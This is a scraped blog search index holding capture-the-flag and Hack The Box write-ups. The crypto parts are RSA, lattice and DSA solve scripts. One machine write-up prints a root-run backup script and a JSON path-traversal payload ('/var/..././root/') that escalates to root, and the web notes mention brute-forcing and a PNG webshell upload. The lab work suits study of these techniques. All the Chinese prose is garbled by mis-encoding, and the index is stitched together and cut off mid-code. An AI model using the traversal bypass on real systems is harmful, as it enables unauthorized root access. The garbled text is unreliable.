åœ¨é¢˜ç›®ç¦ç”¨çš„ä¹±ä¸ƒå…«ç³Ÿçš„æƒ…å†µä¸‹ä¹Ÿæ˜¯ä¸€ä¸ªå¥½æ–¹æ³•ï¼Œå¯ä»¥ç›´æ¥å»è¯»flagï¼Œçˆ½å•¦ ","date":"2025-03-24","objectID":"/htb-alert_and_linkvortex_and_code/:2:6","tags":["æ¸—é€"],"title":"HTB Alert\u0026LinkVortex\u0026code","uri":"/htb-alert_and_linkvortex_and_code/"},{"categories":["é¶åœº"],"content":"codeçš„root.txt martin@code:~$ sudo -l Matching Defaults entries for martin on localhost: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User martin may run the following commands on localhost: (ALL : ALL) NOPASSWD: /usr/bin/backy.sh martin@code:~$ ls -la /usr/bin/backy.sh -rwxr-xr-x 1 root root 926 Sep 16 2024 /usr/bin/backy.sh martin@code:~$ cat /usr/bin/backy.sh #!/bin/bash if [[ $# -ne 1 ]]; then /usr/bin/echo \"Usage: $0 \u003ctask.json\u003e\" exit 1 fi json_file=\"$1\" if [[ ! -f \"$json_file\" ]]; then /usr/bin/echo \"Error: File '$json_file' not found.\" exit 1 fi allowed_paths=(\"/var/\" \"/home/\") updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub(\"\\\\.\\\\./\"; \"\"))' \"$json_file\") /usr/bin/echo \"$updated_json\" \u003e \"$json_file\" directories_to_archive=$(/usr/bin/echo \"$updated_json\" | /usr/bin/jq -r '.directories_to_archive[]') is_allowed_path() { local path=\"$1\" for allowed_path in \"${allowed_paths[@]}\"; do if [[ \"$path\" == $allowed_path* ]]; then return 0 fi done return 1 } for dir in $directories_to_archive; do if ! is_allowed_path \"$dir\"; then /usr/bin/echo \"Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed.\" exit 1 fi done /usr/bin/backy \"$json_file\" å“ï¼Œè¿™ä¸ªå…¶å®æ˜¯ä¸€ä¸ªå¼€æºçš„ä¸œè¥¿ï¼Œgithubå¯ä»¥æ‰¾åˆ°ï¼Œç±»ä¼¼å¤‡ä»½ï¼Œå¯ä»¥çœ‹åˆ°ç¦ç”¨äº†ç›®å½•ç©¿è¶Šï¼Œä½†æ˜¯åªæ˜¯æ›¿æ¢æˆç©ºæ ¼ï¼Œé‚£ä¹ˆåŒå†™ç»•è¿‡å°±è¡Œäº†ï¼Œé™¤äº†è¿™ä¸ªæ–¹æ³•ï¼Œè¿˜å¯ä»¥å†™.jsonè€è€å®å®çš„å†™ { \"destination\": \"/home/martin/backups\", \"verbose_log\": true, \"directories_to_sync\": [ \"/var/../root/\" ], \"directories_to_archive\": [ \"/var/..././root/\" ] } å»è¯»rootçš„å…¨éƒ¨è·¯å¾„åˆ°backupï¼Œç„¶åå‘ç°ç”Ÿæˆçš„.tar.gz2åŒ…rootæ‰å¯ä»¥è¯»ï¼Œå“ï¼Œæ€ä¹ˆåŠå‘¢ï¼Ÿ base64æ˜¯ä¸ªä¼Ÿå¤§çš„ä¸œè¥¿ï¼Œå¯ä»¥æŠŠæ•´ä¸ªæ–‡ä»¶è½¬æˆbase64ï¼Œç„¶åå»æœ¬åœ°è§£å¯†æˆ.tar.gz2ï¼Œä¹Ÿå°±æ˜¯base64 -d encoded.txt \u003e 1.tar.gz2ï¼Œç„¶åè§£å‹å¾—åˆ°flag ","date":"2025-03-24","objectID":"/htb-alert_and_linkvortex_and_code/:2:7","tags":["æ¸—é€"],"title":"HTB Alert\u0026LinkVortex\u0026code","uri":"/htb-alert_and_linkvortex_and_code/"},{"categories":["CTF"],"content":"å‰è¨€ å»å—äº¬çš„è·¯ä¸Šï¼Œé¡ºæ‰‹å†™å†™ ","date":"2025-03-22","objectID":"/2025polarctf/:1:0","tags":["crypto"],"title":"2025PolarCTFæ˜¥å­£èµ›","uri":"/2025polarctf/"},{"categories":["CTF"],"content":"é¢˜ç›® ","date":"2025-03-22","objectID":"/2025polarctf/:2:0","tags":["crypto"],"title":"2025PolarCTFæ˜¥å­£èµ›","uri":"/2025polarctf/"},{"categories":["CTF"],"content":"crypto RSA1-2 task import os from Crypto.Util.number import * from typing import Union from flag import flag bits = 512 def polar(msg: Union[bytes, bytearray], length: int) -\u003e bytes: assert length \u003e len(msg), \"æŒ‡å®šçš„é•¿åº¦å¿…é¡»å¤§äºåŸå§‹æ¶ˆæ¯é•¿åº¦åŠ  1ã€‚\" return bytes(msg) + b'\\x00' + os.urandom(length - len(msg) - 1) def unpolar(msg: Union[bytes, bytearray]) -\u003e bytes: msg = bytes(msg) assert b'\\x00' in msg, \"è¾“å…¥çš„å­—èŠ‚ä¸²ä¸­ä¸åŒ…å«åˆ†éš”ç¬¦ã€‚\" return msg.split(b'\\x00')[0] def getflag1(m): result = [] for i in range(2): result.append(getPrime(bits)) p, q = result if p \u003c= q: p, q = q, p e = 0x10001 n = p * q c = pow(m, e, n) hint = pow(2024 * p + 2025, q, n) print('---------- getflag 1 ----------') print(f'{c = }') print(f'{n = }') print(f'{hint = }') def getflag2(m): result = [] for i in range(2): result.append(getPrime(bits)) p, q = result n = p * q hint1 = pow(m, p, n) hint2 = pow(m, q, n) print('---------- getflag 2 ----------') print(f'{hint1 = }') print(f'{hint2 = }') print(f'{n = }') def getflag3(m): result = [] for i in range(2): result.append(getPrime(bits)) p, q = result e = 0x10001 n = p * q g = 20242025 hint = pow(g + p * 1111, e, n) c = pow(m, e, n) print('---------- getflag 3 ----------') print(f'{c = }') print(f'{n = }') print(f'{hint = }') assert len(flag) == 42 mm = [] for i in range(0, 42, 14): mm.append(bytes_to_long(polar(flag[i:i + 14], bits // 4 - 1))) m1, m2, m3 = mm getflag1(m1) getflag2(m2) getflag3(m3) ä¸‰ä¸ªå¾ˆç»å…¸çš„æ•°è®ºé¢˜å †åˆ°äº†ä¸€èµ·ï¼Œé¢ï¼Œåé¢è¡¥é•¿åº¦ï¼Œå…¶å®æ²¡å•¥åŒºåˆ«ï¼Œç›´æ¥å†™å°±è¡Œäº†ï¼Œå¦‚æœæƒ³çœ‹ç»†èŠ‚æ¨å¯¼çš„è¯ï¼Œå¯ä»¥ç­‰æˆ‘ä¸‹å‘¨å†™ï¼ˆ exp from Crypto.Util.number import * import gmpy2 c = n = hint = e=65537 p = gmpy2.gcd(pow(2025,n,n)-hint,n) q = n // p d = gmpy2.invert(e,(p-1)*(q-1)) m = pow(c,d,n) print(long_to_bytes(m)) from Crypto.Util.number import * n = x = y = a=pow(x,n,n) p=GCD(a-y,n) q=n//p d = inverse(p,(p-1)*(q-1)) m = pow(x,d,n) print(long_to_bytes(m)) from Crypto.Util.number import * import gmpy2 c = n = hint = e = 65537 b = 20242025 p = gmpy2.gcd(pow(b,e,n)-hint,n) q = n // p d = gmpy2.invert(e,(p-1)*(q-1)) m = pow(c,d,n) print(long_to_bytes(m)) beginner task assert(len(open('flag.txt', 'rb').read()) \u003c= 50) assert(str(int.from_bytes(open('flag.txt', 'rb').read(), byteorder='big') \u003c\u003c 10000).endswith('16732186163543403522711798960598469149029861032300263763941636254755451456334507142958574415880945599253440468447483752611840')) #endwithåä¸º125ä½ #å…¶ä¸­åŠ å¯†æ–¹å¼ä¸ºutf-8 åˆ†è§£æ¨¡æ•°ä¹‹ååˆ†å¼€å¤„ç†ï¼Œè®¡ç®— 1840 èƒ½è¢« 2 æ•´é™¤çš„æœ€é«˜æ¬¡å¹‚ï¼Œç„¶åæå®šå°±è¡Œäº† K = 16732186163543403522711798960598469149029861032300263763941636254755451456334507142958574415880945599253440468447483752611840 m = 5**125 r = pow(2, 10000, m) r_inv = pow(r, -1, m) F = (K % m * r_inv) % m uflag = F.to_bytes((F.bit_length() + 7) // 8, byteorder='big').decode('utf-8') print(uflag) Ununicast task import libnum import gmpy2 import random from flag import * m = libnum.s2n(flag) n_list = [] c_list = [] q_list = [] p_list = [] for i in range(1, 6): p = libnum.generate_prime(1024) q = libnum.generate_prime(1024) n = p * q * (i + 1) p_list.append(p) q_list.append(q) n_list.append(n) while True: e = random.randint(10, 30) if gmpy2.is_prime(e): break for index in range(len(n_list)): c = pow(m, e, n_list[index]) c_list.append(c_list.append(c * (index + 1))) print(\"n\" + str(index + 1) + \" =\", n_list[index]) print(\"c\" + str(index + 1) + \" =\", c_list[index]) ç»å…¸çš„crté—®é¢˜ï¼Œç¨å¾®å¤æ‚ä¸€ç‚¹ï¼Œçœ‹çœ‹äº’ç´ çš„æ˜¯å“ªå‡ ä¸ªï¼Œç„¶åç®—æ¨¡é€†ï¼Œeçš„ç­›é€‰ä¸ç”¨ç®¡ï¼Œéå†å°±è¡Œäº† exp import gmpy2 k1 = c1 k2 = c2 // 2 k4 = c4 // 4 # è®¡ç®— N å’Œ CRT å‚æ•° N = n1 * n2 * n4 y1 = n2 * n4 y2 = n1 * n4 y4 = n1 * n2 # è®¡ç®—æ¨¡é€† z1 = gmpy2.invert(y1, n1) z2 = gmpy2.invert(y2, n2) z4 = gmpy2.invert(y4, n4) # è®¡ç®— a = m^e mod N a = (k1 * y1 * z1 % N + k2 * y2 * z2 % N + k4 * y4 * z4 % N) % N # å¯èƒ½çš„ e å€¼ possible_e = [11, 13, 17, 19, 23, 29] # å°è¯•æ¯ä¸ª eï¼Œè®¡ç®— m for e in possible_e: root, exact = gmpy2.iroot(a, e) if exact: m = int(root) # å°† m è½¬æ¢ä¸ºå­—èŠ‚ flag_bytes = m.to_bytes((m.bit_length() + 7) // 8, 'big') try: # å°è¯•è§£ç ä¸ºå­—ç¬¦ä¸² flag = flag_bytes.decode('ascii') print(f\"e = {e}, flag = {flag}\") # æ£€æŸ¥æ˜¯å¦ç¬¦åˆ flag æ ¼å¼ if flag.startswith('flag{'): print(f\"æ‰¾åˆ° flag: {flag}\") break except UnicodeDecodeError: print(f\"e = {e}, flag_bytes = {flag_b","date":"2025-03-22","objectID":"/2025polarctf/:2:1","tags":["crypto"],"title":"2025PolarCTFæ˜¥å­£èµ›","uri":"/2025polarctf/"},{"categories":["CTF"],"content":"web æ¥ä¸ªå¼¹çª— å°±æ˜¯ä¸ªxssï¼Œç›´æ¥ä¸€æŠŠæ¢­å“ˆ æ¤°å­æ ‘æ™•æ·¡æ°´é±¼ çœŸæ­£çš„ä¿¡æ¯æ”¶é›†ï¼Œä½ å¯ä»¥çœ‹è§è—å¤´è¯—â€œæ–‡ä»¶ä¸Šä¼ â€ï¼Œç„¶åå…³äºé‡Œé¢æ˜¯ç”¨æˆ·åï¼Œå¯†ç æœ¬å¯ä»¥é dirbæ‰«å‡ºæ¥ï¼Œç„¶åbpå¼€çˆ†ï¼Œç„¶åæ˜¯ä¸ªæ–‡ä»¶ä¸Šä¼ ï¼Œä¼ ä¸ªpngé©¬ï¼Œç„¶åèš‚å‰‘ä¸Šä¸å»ï¼Œæ‰‹æ‰“å¾—åˆ°flagï¼Œåœ¨æ ¹ç›®å½• cokeçš„ç™»é™† f12çœ‹cookieæ˜¯å¯†ç ï¼Œè´¦æˆ·æ˜¯coke å…¶ä»–çš„å¿˜äº†è¿‡ç¨‹äº† ","date":"2025-03-22","objectID":"/2025polarctf/:2:2","tags":["crypto"],"title":"2025PolarCTFæ˜¥å­£èµ›","uri":"/2025polarctf/"},{"categories":["CTF"],"content":"æ€»ç»“ 2025PolarCTFæ˜¥å­£èµ›è´¨é‡è¿˜å¥½å§ï¼Œåœ¨è½¦ä¸Šä¸èƒ½è®¤çœŸçš„å»å†™ï¼Œæœ‰å¾ˆå¤šçäº‹ç¼ èº«ï¼Œæœ€årankæ˜¯12æœ‰ç‚¹å¯æƒœå§ï¼Œæ¯•ç«Ÿåé¢å‡ ä¸ªå°æ—¶ä¸€ç›´æ²¡å†™ï¼Œwpä¹Ÿæ‡’å¾—å†™äº† ","date":"2025-03-22","objectID":"/2025polarctf/:3:0","tags":["crypto"],"title":"2025PolarCTFæ˜¥å­£èµ›","uri":"/2025polarctf/"},{"categories":["CTF"],"content":"å‰è¨€ è´¨é‡æŒºé«˜çš„ä¸€åœºæ–°ç”Ÿèµ›ï¼Œè€ç™»å¤§ä¹±æ–—ï¼ˆï¼‰ï¼Œè¿™é‡Œåªå†™ä¸€éƒ¨åˆ†wp ","date":"2025-03-09","objectID":"/hgctf2025/:1:0","tags":["crypto"],"title":"Hgctf2025","uri":"/hgctf2025/"},{"categories":["CTF"],"content":"cryptoé¢˜ç›® ","date":"2025-03-09","objectID":"/hgctf2025/:2:0","tags":["crypto"],"title":"Hgctf2025","uri":"/hgctf2025/"},{"categories":["CTF"],"content":"baby_factor task from Crypto.Util.number import * def create(): pl = [] for i in range(3): pl.append(getPrime(1024)) return sorted(pl) pl = create() m=b'NSSCTF{xxx}' p,q,r = pl[0],pl[1],pl[2] e = 65537 n = p*q*r phi = (p-1)*(q-1)*(r-1) c=pow(bytes_to_long(m),e,n) print(f'n={n}') print(f'phi={phi}') print(f'c={c}') å¥½åƒæ˜¯å‡ºé¢˜äººæ•°æ®é—®é¢˜ exp n= phi= c= e=65537 from Crypto.Util.number import * m=pow(c,inverse(e,phi),n) flag=long_to_bytes(m) print(flag) ","date":"2025-03-09","objectID":"/hgctf2025/:2:1","tags":["crypto"],"title":"Hgctf2025","uri":"/hgctf2025/"},{"categories":["CTF"],"content":"baby_factor_revenge task from Crypto.Util.number import * def create(): pl = [] for i in range(3): pl.append(getPrime(1024)) return sorted(pl) pl = create() m=b'NSSCTF{xxxxxx}' p,q,r = pl[0],pl[1],pl[2] n = p*q*r phi = (p-1)*(q-1)*(r-1) e=65537 phi_2=(p-1)*(q-1) n2=p*q c=pow(bytes_to_long(m),e,n2) print(f'n={n}') print(f'phi={phi}') print(f'c={c}') ç»å…¸çš„å·²çŸ¥phi\u0026nåˆ†è§£ exp from math import gcd from math import isqrt from random import randrange from gmpy2 import is_prime def factorize(N, phi): \"\"\" Recovers the prime factors from a modulus if Euler's totient is known. This method only works for a modulus consisting of 2 primes! :param N: the modulus :param phi: Euler's totient, the order of the multiplicative group modulo N :return: a tuple containing the prime factors, or None if the factors were not found \"\"\" s = N + 1 - phi d = s ** 2 - 4 * N p = int(s - isqrt(d)) // 2 q = int(s + isqrt(d)) // 2 return p, q def factorize_multi_prime(N, phi): \"\"\" Recovers the prime factors from a modulus if Euler's totient is known. This method works for a modulus consisting of any number of primes, but is considerably be slower than factorize. More information: Hinek M. J., Low M. K., Teske E., \"On Some Attacks on Multi-prime RSA\" (Section 3) :param N: the modulus :param phi: Euler's totient, the order of the multiplicative group modulo N :return: a tuple containing the prime factors \"\"\" prime_factors = set() factors = [N] while len(factors) \u003e 0: # Element to factorize. N = factors[0] w = randrange(2, N - 1) i = 1 while phi % (2 ** i) == 0: sqrt_1 = pow(w, phi // (2 ** i), N) if sqrt_1 \u003e 1 and sqrt_1 != N - 1: # We can remove the element to factorize now, because we have a factorization. factors = factors[1:] p = gcd(N, sqrt_1 + 1) q = N // p if is_prime(p): prime_factors.add(p) elif p \u003e 1: factors.append(p) if is_prime(q): prime_factors.add(q) elif q \u003e 1: factors.append(q) # Continue in the outer loop break i += 1 return tuple(prime_factors) n= phi= c= prime_list = sorted(factorize_multi_prime(n,phi)) p,q,r = prime_list[0],prime_list[1],prime_list[2] print(p,q,r) p= q= r= from Crypto.Util.number import * e=65537 phi1=(p-1) n1=p d=inverse(e,phi1) ck=pow(c,d,n1) print(long_to_bytes(ck)) ","date":"2025-03-09","objectID":"/hgctf2025/:2:2","tags":["crypto"],"title":"Hgctf2025","uri":"/hgctf2025/"},{"categories":["CTF"],"content":"baby_lattice task from Crypto.Util.number import * from Crypto.Cipher import AES import os from Crypto.Util.Padding import pad from secret import flag miku = 30 p = getPrime(512) key = getPrime(512) while key\u003e p: key= getPrime(512) ts = [] gs = [] zs = [] for i in range(miku): t = getPrime(512) z = getPrime(400) g= (t * key + z) % p ts.append(t) gs.append(g) zs.append(z) print(f'p = {p}') print(f'ts = {ts}') print(f'gs = {gs}') iv= os.urandom(16) cipher = AES.new(str(key).encode()[:16], AES.MODE_CBC,iv) ciphertext=cipher.encrypt(pad(flag.encode(),16)) print(f'iv={iv}') print(f'ciphertext={ciphertext}') å°±æ˜¯æœ€ç®€å•çš„NHPé—®é¢˜ exp p = ts = gs = iv=b'\\x88\\x0c\\x7f\\x92\\xd7\\xb7\\xaf4\\xe4\\xfb\\xd1_\\xab\\xff)\\xb8' ciphertext=b'\\x94\\x198\\xd6\\xa2mK\\x00\\x06\\x7f\\xad\\xa0M\\xf7\\xadV;EO$\\xee\\xcdB0)\\xfb!\u00268%,M' p = p rs = ts cs = gs t = len(rs) kbits = 400 K = 2 ** kbits P = identity_matrix(t) * p RC = matrix([[-1, 0], [0, 1]]) * matrix([rs, cs]) KP = matrix([[K / p, 0], [0, K]]) M = block_matrix([[P, 0], [RC, KP]], subdivide=False) shortest_vector = M.LLL() x = shortest_vector[1, -2] / K * p % p print(x) from Crypto.Cipher import AES from Crypto.Util.Padding import unpad key = aes_key = str(key).encode()[:16] iv=b'\\x88\\x0c\\x7f\\x92\\xd7\\xb7\\xaf4\\xe4\\xfb\\xd1_\\xab\\xff)\\xb8' ciphertext=b'\\x94\\x198\\xd6\\xa2mK\\x00\\x06\\x7f\\xad\\xa0M\\xf7\\xadV;EO$\\xee\\xcdB0)\\xfb!\u00268%,M' cipher = AES.new(aes_key, AES.MODE_CBC, iv) flag = unpad(cipher.decrypt(ciphertext), 16) print(flag) ","date":"2025-03-09","objectID":"/hgctf2025/:2:3","tags":["crypto"],"title":"Hgctf2025","uri":"/hgctf2025/"},{"categories":["CTF"],"content":"babysignin task from Crypto.Util.number import getPrime, bytes_to_long p=getPrime(128) q=getPrime(128) n=p*q phi=(p-1)*(q-1) flag=\"NSSCTF{xxxxxx}\" print(\"p=\",p) print(\"q=\",q) m=bytes_to_long(flag.encode()) e=4 c=pow(m,e,n) print(\"c=\",c) print(\"n=\",n) crtæ¢­å“ˆï¼Œæˆ–è€…æ˜¯å½“ä½œe\u0026phiä¸äº’ç´ å»å†™ exp p = q = c = n = p * q c_p = c % p c_q = c % q from sympy.ntheory.residue_ntheory import nthroot_mod roots_p = nthroot_mod(c_p, 4, p, all_roots=True) roots_q = nthroot_mod(c_q, 4, q, all_roots=True) from sympy.ntheory.modular import crt from Crypto.Util.number import long_to_bytes for root_p in roots_p: for root_q in roots_q: m, _ = crt([p, q], [root_p, root_q]) flag = long_to_bytes(m) if b'NSSCTF{' in flag: print(flag) exit() from Crypto.Util.number import * p= q= c= n= e= 4 phi = (p-1)*(q-1) gcd = GCD(e,phi) res1 = Zmod(p)(c).nth_root(gcd, all=True) res2 = Zmod(q)(c).nth_root(gcd, all=True) for i in res1: for j in res2: m = crt([int(i),int(j)],[p,q]) if m is not None: try: print(long_to_bytes(int(m)).decode()) except Exception as e: continue ","date":"2025-03-09","objectID":"/hgctf2025/:2:4","tags":["crypto"],"title":"Hgctf2025","uri":"/hgctf2025/"},{"categories":["CTF"],"content":"ez_femat task from Crypto.Util.number import getPrime, bytes_to_long from secret import f flag = b'NSSCTF{test_flag}' p = getPrime(512) q = getPrime(512) n = p*q m = bytes_to_long(flag) e = 65537 c = pow(m,e,n) R.\u003cx\u003e = ZZ[] f = R(str(f)) w = pow(2,f(p),n) print(f'{n = }\\n') print(f'{e = }\\n') print(f'{c = }\\n') print(f'{f = }\\n') print(f'{w = }\\n') å…¶å®å½“æ—¶çœ‹åˆ°é¢˜ç›®æ˜¯è´¹é©¬çš„æ—¶å€™æ²¡æœ‰æƒ³é‚£ä¹ˆå¤šï¼Œæˆ‘æŠŠp-1å½“ä½œå¯ä»¥è¢«è¿™ä¸ªå¤šé¡¹å¼æ•´é™¤çš„å¼å­ï¼Œå°±ç›´æ¥ç®—x=1çš„æƒ…å†µï¼Œç»“æœçœŸå‡ºæ¥äº†ï¼ˆï¼‰ exp from sage.all import * var('x') f_str = \"\" f = sage_eval(f_str, locals={'x': x}) f1 = f.subs(x=1) print(f\"f(1) = {f1}\") from Crypto.Util.number import inverse, GCD, long_to_bytes n = e = 65537 c = w = a = -57 b = inverse(pow(2, -a, n), n) d = GCD(w - b, n) if 1 \u003c d \u003c n: p = d q = n // p else: p = n // d q = d phi = (p - 1) * (q - 1) d = inverse(e, phi) m = pow(c, d, n) flag = long_to_bytes(m) print(flag) ","date":"2025-03-09","objectID":"/hgctf2025/:2:5","tags":["crypto"],"title":"Hgctf2025","uri":"/hgctf2025/"},{"categories":["CTF"],"content":"EZ_Fermat_bag_PRO task from Crypto.Util.number import getPrime, bytes_to_long from random import * from secret import f, flag assert len(flag) == 88 assert flag.startswith(b'NSSCTF{') assert flag.endswith(b'}') p = getPrime(512) q = getPrime(512) n = p*q P.\u003cx,y\u003e = ZZ[] f = P(str(f)) w = pow(2,f(p,q),n) assert all(chr(i) in ''.join(list(set(str(p)))) for i in flag[7:-1:]) c = bytes_to_long(flag) % p print(f'{n = }\\n') print(f'{f = }\\n') print(f'{w = }\\n') print(f'{c = }\\n') ä¸ä¸Šä¸€ä¸ªä¸åŒçš„æ˜¯è¿™ä¸ªæ˜¯xyåŒå…ƒå¤šé¡¹å¼ï¼Œç¬¬ä¸€å¼€å§‹çš„æƒ³æ³•å°±æ˜¯æŠŠä»–å˜æˆå•å…ƒçš„ï¼Œç„¶åå‘ç°æ€ä¹ˆå†™æ€ä¹ˆä¸å¯¹ï¼Œå®Œå•¦ åé¢å‘ç°æ­£ç¡®çš„æ€ç»´æ˜¯æŠŠè¿™ä¸ªå…ˆå¯¹fæ¢å…ƒï¼ŒæŠŠyæ¶ˆæ‰ï¼Œç„¶åæ„é€ è´¹é©¬å®šç†ï¼Œä¼°è®¡ä¸Šä¸€é¢˜ä¹Ÿæ˜¯ççŒ«ç¢°æ­»è€—å­ï¼Œæ±‚å‡ºpåå‘ç°å¾ˆéš¾çˆ†ç ´å‡ºæ¥ï¼Œå…¶å®æ˜¯ç±»ä¼¼é¸¡å—ç¥çš„nssdlcå…³å¡ï¼Œä¸çŸ¥é“å‡ºé¢˜äººçš„çµæ„Ÿæ˜¯ä¸æ˜¯ä»è¿™æ¥çš„ exp from Crypto.Util.number import * n = w = c = P.\u003cx,y\u003e = PolynomialRing(ZZ) f = g = f(x,n/x)(x+1,0) print(g) p = GCD(pow(2,g(0,0),n)-w,n) from Crypto.Util.number import * p=12887845651556262230127533819087214645114299622757184262163859030601366568025020416006528177186367994745018858915213064803349065489849643880676026721892753 c = 10266913434526071998707605266130137733134248608585146234981245806763995653822203763396430876254213500327272952979577138542487120755771047170064775346450942 Ge = Matrix(ZZ,82,82) temp = bytes_to_long(b\"NSSCTF{\") * 256^81 + bytes_to_long(b\"}\") for i in range(80): temp += 48*256^(80-i) for i in range(80): Ge[i,i] = 1 Ge[i,-1] = 256^(80-i) Ge[-2,-2] = 3 Ge[-2,-1] = (temp - c) Ge[-1,-1] = p for line in Ge.BKZ(): m = \"\" if line[-1] == 0 and abs(line[-2]) == 3: print(line) for i in line[:-2]: m += str(abs(i)) flag = \"NSSCTF{\" + m + \"}\" print(flag) (ä¸çŸ¥é“ä¸ºå•¥å­ä¼šæ±‚å‡ºæ¥ä¸¤ä¸ªï¼Œå¥‡å¥‡æ€ªæ€ª) ","date":"2025-03-09","objectID":"/hgctf2025/:2:6","tags":["crypto"],"title":"Hgctf2025","uri":"/hgctf2025/"},{"categories":["CTF"],"content":"MIMT_RSA task from Crypto.Util.number import * from hashlib import md5 from secret import KEYï¼Œ flag assert int(KEY).bit_length() == 36 assert not isPrime(KEY) p = getPrime(1024) q = getPrime(1024) n = p * q e = 0x10001 ck = pow(KEY, e, n) assert flag == b'NSSCTF{' + md5(str(KEY).encode()).hexdigest().encode() + b'}' print(f\"{n = }\") print(f\"{e = }\") print(f\"{ck = }\") é¢˜ç›®åå­—ç›´æ¥è¯´äº†æ˜¯mitmï¼Œå°±å¾€ä¸Šé¢é å‘—ï¼ŒKEYæ˜¯ä¸‰åå…­ä½çš„ï¼Œæœ¬æ¥æƒ³ç€ä»18ä½å¼€å§‹çˆ†ï¼Œå‘ç°å‡ºä¸æ¥ï¼Œä¿®æ”¹èŒƒå›´è¯•è¯•å°±è¡Œäº†ï¼Œå“ˆå¸Œè¡¨åŠ å¤šè¿›ç¨‹è¿˜æ˜¯å¾ˆå¿«çš„ï¼Œä½†æ˜¯æˆ‘ä»£ç å†™çš„ä¾æ‰˜ exp import gmpy2 from gmpy2 import powmod, invert import multiprocessing as mp from hashlib import md5 n = e = ck = def precompute_a(start, end, queue): hash_table = {} for a in range(start, end): a_e = powmod(a, e, n) hash_table[a_e] = a queue.put(hash_table) def search_b(start, end, hash_table, queue): result = None for b in range(start, end): b_e = powmod(b, e, n) try: inv_b_e = invert(b_e, n) except gmpy2.ZeroDivisionError: continue tmp = (ck * inv_b_e) % n if tmp in hash_table: a = hash_table[tmp] KEY = a * b if KEY.bit_length() == 36 and not gmpy2.is_prime(KEY): result = KEY break queue.put(result) def main(): a_start = 1 a_end = 2**20 # æ‰©å¤§èŒƒå›´è‡³2^19ï¼Œè¦†ç›–1åˆ°524287 num_processes = 8 chunk_size = (a_end - a_start + num_processes - 1) // num_processes # ç¡®ä¿è¦†ç›–æ‰€æœ‰aå€¼ manager = mp.Manager() queue = manager.Queue() processes = [] for i in range(num_processes): start = a_start + i * chunk_size end = min(start + chunk_size, a_end) p = mp.Process(target=precompute_a, args=(start, end, queue)) processes.append(p) p.start() hash_table = {} for _ in range(num_processes): ht = queue.get() hash_table.update(ht) for p in processes: p.join() print(f\"Hash table size: {len(hash_table)}\") b_start = 1 b_end = 2**20 # ä¿®æ­£bçš„åˆ†å‰²æ–¹å¼ï¼Œç¡®ä¿è¦†ç›–æ‰€æœ‰å€¼ b_chunk_size = (b_end - b_start + num_processes - 1) // num_processes result_queue = manager.Queue() processes = [] for i in range(num_processes): start = b_start + i * b_chunk_size end = min(start + b_chunk_size, b_end) p = mp.Process(target=search_b, args=(start, end, hash_table, result_queue)) processes.append(p) p.start() KEY = None for _ in range(num_processes): res = result_queue.get() if res is not None: KEY = res # ç»ˆæ­¢æ‰€æœ‰è¿›ç¨‹ for p in processes: if p.is_alive(): p.terminate() break for p in processes: p.join() if KEY is not None: print(f\"Found KEY: {KEY}\") md5_hash = md5(str(KEY).encode()).hexdigest() flag = f\"NSSCTF{{{md5_hash}}}\" print(flag) else: print(\"KEY not found. Consider further expanding the search range or optimizing the factorization strategy.\") if __name__ == \"__main__\": main() ","date":"2025-03-09","objectID":"/hgctf2025/:2:7","tags":["crypto"],"title":"Hgctf2025","uri":"/hgctf2025/"},{"categories":["CTF"],"content":"RSA_and_DSA task from random import getrandbits, randint from secrets import randbelow from Crypto.Util.number import* from Crypto.Util.Padding import pad from Crypto.Cipher import AES import hashlib import random import gmpy2 ink=getPrime(20) p1= getPrime(512) q1= getPrime(512) N = p1* q1 phi = (p1-1) * (q1-1) while True: d1= getRandomNBitInteger(200) if GCD(d1, phi) == 1: e = inverse(d1, phi) break c_ink = pow(ink, e, N) print(f'c_ink=',c_ink) print(f'e=',e) print(f'N=',N) link=261641 k= getPrime(64) q = getPrime(160) def sign(msg, pub, pri, k): (p,q,g,y) = pub x = pri r = int(pow(g, k, p) % q) h = int(hashlib.sha256(msg).digest().hex(),16) s = int((h + x * r) * gmpy2.invert(k, q) % q) return (r, s) while True: temp = q * getrandbits(864) if isPrime(temp + 1): p = temp + 1 break assert p % q == 1 h = randint(1, p - 1) g = pow(h, (p - 1) // q, p) y = pow(g, k, p) pub = (p,q,g,y) pri = random.randint(1, q-1) print(f\"(r1,s1)=\",sign(b'GHCTF-2025', pub, pri, k)) print(f\"(r2,s2)=\",sign(b'GHCTF-2025', pub, pri, k+ink)) print(f\"{g= }\") print(f\"{q= }\") print(f\"{p= }\") print(f\"{y= }\") key = hashlib.sha1(str(pri).encode()).digest()[:16] cipher = AES.new(key, AES.MODE_ECB) flag=\"NSSCTF{xxxxxxxx}\" ciphertext = cipher.encrypt(pad(flag.encode(), 16)) print(f\"{ciphertext = }\") å‰åŠæ®µæ˜æ˜¾çš„ç»´çº³æ”»å‡»ï¼ŒååŠæ®µdsaï¼Œå‰é¢æ¿å­å°±ä¸å†™äº†ï¼Œåªæ”¾åé¢çš„ exp import hashlib import gmpy2 from Crypto.Cipher import AES (r1,s1)= (..., ...) (r2,s2)= (..., ...) g= ... q= ... p= ... y= ... ciphertext = ... msg = b'GHCTF-2025' h = int(hashlib.sha256(msg).digest().hex(),16) a = 1 b =... k = ((h*(r2 - r1) + b*r1*s2)*gmpy2.invert((r2*s1-a*r1*s2),q)) % q x1 = (k*s1 - h)*gmpy2.invert(r1,q) % q print(x1) key = hashlib.sha1(str(x1).encode()).digest()[:16] cipher = AES.new(key, AES.MODE_ECB) ptext=cipher.decrypt(ciphertext) print(ptext) ","date":"2025-03-09","objectID":"/hgctf2025/:2:8","tags":["crypto"],"title":"Hgctf2025","uri":"/hgctf2025/"},{"categories":["CTF"],"content":"river task from Crypto.Cipher import AES from Crypto.Util.Padding import pad from hashlib import md5 from secret import flag, seed, mask class è¸©è¸©èƒŒ: def __init__(self, n, seed, mask, lfsr=None): self.state = [int(b) for b in f\"{seed:0{n}b}\"] self.mask_bits = [int(b) for b in f\"{mask:0{n}b}\"] self.n = n self.lfsr = lfsr def update(self): s = sum([self.state[i] * self.mask_bits[i] for i in range(self.n)]) \u0026 1 self.state = self.state[1:] + [s] def __call__(self): if self.lfsr: if self.lfsr(): self.update() return self.state[-1] else: self.update() return self.state[-1] class å¥¶é¾™(è¸©è¸©èƒŒ): def __init__(self, n, seed, mask): super().__init__(n, seed, mask, lfsr=None) n = 64 assert seed.bit_length == mask.bit_length == n lfsr1 = å¥¶é¾™(n, seed, mask) 